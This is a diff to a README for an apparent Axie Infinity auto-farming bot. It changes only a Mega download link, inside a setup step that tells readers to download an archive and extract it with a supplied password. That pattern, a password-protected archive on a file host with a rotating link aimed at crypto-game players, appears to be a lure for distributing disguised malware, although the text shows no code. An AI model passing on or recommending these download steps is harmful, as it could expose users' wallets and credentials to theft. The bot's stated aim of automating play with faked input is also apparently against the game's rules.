@@ -9,7 +9,7 @@ Fully auto play farming script for Axie Infinity. Software uses screen pixels sc
 - Random keyboard and mouse activity
 
 ### Setup
-- [Download](https://github.com/psichedel/Axie-Farm-bot/archive/refs/heads/main.zip) repository and extract files with password `bGMGOmUsgm` ([Github](https://github.com/psichedel/Axie-Farm-bot/archive/refs/heads/main.zip) | [Mega](https://mega.nz/file/ut9GiIoB#xEOEZT8qoUAaNNnuywRK1K2HiJe1HZmLEeSoqvEmpRc))
+- [Download](https://github.com/psichedel/Axie-Farm-bot/archive/refs/heads/main.zip) repository and extract files with password `bGMGOmUsgm` ([Github](https://github.com/psichedel/Axie-Farm-bot/archive/refs/heads/main.zip) | [Mega](https://mega.nz/file/b2pH3ajT#GQunT0lKwe0q4PHa1JYj052bV2QKqE_8kwICwAw6p5g))
 - Launch Mavis and Axie in full-screen mode
 - Launch bot and select mode you need
 
